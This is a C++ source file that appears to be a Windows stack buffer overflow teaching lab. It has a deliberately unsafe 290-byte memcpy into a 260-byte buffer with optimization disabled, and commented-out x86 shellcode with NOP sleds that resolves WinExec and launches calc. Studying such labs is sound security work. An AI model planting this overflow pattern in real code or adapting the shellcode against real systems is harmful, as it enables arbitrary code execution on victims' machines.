// StackOverflow.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <fstream>
#include <windows.h>

#pragma optimize( "", off )
void ProcessInput(char *str)
{
	char inputCopy[MAX_PATH]{};
	memcpy(inputCopy, str, 290);
}
#pragma optimize( "", on )

//static unsigned char shellcode[] =
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x56\x33\xC0\x64\x8B\x40\x30\x8B\x40\x0C"
//"\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\x8B\xE8"
//"\xBB\x57\x74\xC0\xF4\x33\xC9\x8B\x7D\x3C"
//"\x8B\x7C\x3D\x78\x03\xFD\x8B\x57\x20\x03"
//"\xD5\x8B\x34\x8A\x03\xF5\x33\xC0\x99\xAC"
//"\xC1\xCA\x0D\x03\xD0\x84\xC0\x75\xF6\x41"
//"\x3B\xD3\x75\xE4\x49\x8B\x5F\x24\x03\xDD"
//"\x66\x8B\x0C\x4B\x8B\x5F\x1C\x03\xDD\x8B"
//"\x04\x8B\x03\xC5\xBB\x11\x11\x11\x11\x81"
//"\xF3\x11\x11\x11\x11\x53\x68\x2E\x65\x78"
//"\x65\x68\x63\x61\x6C\x63\x8B\xFC\x57\x57"
//"\x90\xFF\xD0\x90\x90\x90\x90\x90\x90\x90"
//"\x9A\xFE\x19\x00"
//;
//static unsigned char shellcode[] =
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59"
//"\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B"
//"\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F"
//"\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01"
//"\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x42"
//"\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75"
//"\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE"
//"\xFF\xD7\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\xFF\xD0\x90\x90\x90\x90\x90\x90\x90"
//"\x9A\xFE\x19\x00"
//;


int main(int argc, char *argv[])
{
	if (argc < 1) {
		std::cout << "Usage: Pass a string via commandline" << std::endl;
		return -1;
	}

	char buffer[2048]{};
	HANDLE h = ::CreateFile(argv[1], FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (h == INVALID_HANDLE_VALUE) {
		return -1;
	}

	DWORD bytesRead = 0;
	if (!::ReadFile(h, buffer, 2048, &bytesRead, NULL)) {
		return -1;
	}

	CloseHandle(h);
	ProcessInput(buffer);
	return 0;
}
